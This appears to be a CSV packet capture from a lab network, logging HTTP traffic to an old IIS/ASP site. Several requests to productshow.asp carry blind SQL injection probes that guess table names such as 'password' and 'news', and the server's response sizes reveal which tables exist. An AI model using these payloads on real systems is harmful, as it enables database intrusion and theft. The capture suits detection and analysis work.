dst_port,ip_dst,ip_src,msg,src_port,timestamp
56664,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.395887
80,192.168.244.136,192.168.244.1,,56664,2019/03/24 15:35:29.396379
80,192.168.244.136,192.168.244.1,,56664,2019/03/24 15:35:29.396396
80,192.168.244.136,192.168.244.1,,56664,2019/03/24 15:35:29.397224
80,192.168.244.136,192.168.244.1,,56664,2019/03/24 15:35:29.397233
80,192.168.244.136,192.168.244.1,,56665,2019/03/24 15:35:29.407847
56665,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.407866
80,192.168.244.136,192.168.244.1,,56665,2019/03/24 15:35:29.408023
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20???) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56665,2019/03/24 15:35:29.408301
56665,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.458456
80,192.168.244.136,192.168.244.1,,56665,2019/03/24 15:35:29.458687
80,192.168.244.136,192.168.244.1,,56665,2019/03/24 15:35:29.458695
80,192.168.244.136,192.168.244.1,,56665,2019/03/24 15:35:29.460286
80,192.168.244.136,192.168.244.1,,56665,2019/03/24 15:35:29.460301
80,192.168.244.136,192.168.244.1,,56666,2019/03/24 15:35:29.469349
56666,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.469369
80,192.168.244.136,192.168.244.1,,56666,2019/03/24 15:35:29.469564
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20Friend) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56666,2019/03/24 15:35:29.469718
56666,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.522138
80,192.168.244.136,192.168.244.1,,56666,2019/03/24 15:35:29.522432
80,192.168.244.136,192.168.244.1,,56666,2019/03/24 15:35:29.522441
80,192.168.244.136,192.168.244.1,,56666,2019/03/24 15:35:29.523490
80,192.168.244.136,192.168.244.1,,56666,2019/03/24 15:35:29.523511
80,192.168.244.136,192.168.244.1,,56667,2019/03/24 15:35:29.533471
56667,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.533490
80,192.168.244.136,192.168.244.1,,56667,2019/03/24 15:35:29.533630
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20zl) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56667,2019/03/24 15:35:29.533845
56667,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:29.583266
80,192.168.244.136,192.168.244.1,,56667,2019/03/24 15:35:29.583557
80,192.168.244.136,192.168.244.1,,56667,2019/03/24 15:35:29.583567
80,192.168.244.136,192.168.244.1,,56667,2019/03/24 15:35:29.584716
80,192.168.244.136,192.168.244.1,,56667,2019/03/24 15:35:29.584729
80,192.168.244.136,192.168.244.1,,56668,2019/03/24 15:35:29.594177
56668,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.594196
80,192.168.244.136,192.168.244.1,,56668,2019/03/24 15:35:29.594349
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20movie) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56668,2019/03/24 15:35:29.594548
56668,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:29.662022
80,192.168.244.136,192.168.244.1,,56668,2019/03/24 15:35:29.662215
80,192.168.244.136,192.168.244.1,,56668,2019/03/24 15:35:29.662223
80,192.168.244.136,192.168.244.1,,56668,2019/03/24 15:35:29.663202
80,192.168.244.136,192.168.244.1,,56668,2019/03/24 15:35:29.663211
80,192.168.244.136,192.168.244.1,,56669,2019/03/24 15:35:29.676474
56669,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.676494
80,192.168.244.136,192.168.244.1,,56669,2019/03/24 15:35:29.676661
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20news) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56669,2019/03/24 15:35:29.676855
56669,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:29 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:29.739798
80,192.168.244.136,192.168.244.1,,56669,2019/03/24 15:35:29.740047
80,192.168.244.136,192.168.244.1,,56669,2019/03/24 15:35:29.740056
80,192.168.244.136,192.168.244.1,,56669,2019/03/24 15:35:29.741042
80,192.168.244.136,192.168.244.1,,56669,2019/03/24 15:35:29.741057
80,192.168.244.136,192.168.244.1,,56670,2019/03/24 15:35:29.754965
56670,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:29.754986
80,192.168.244.136,192.168.244.1,,56670,2019/03/24 15:35:29.755131
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20password) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56670,2019/03/24 15:35:29.755293
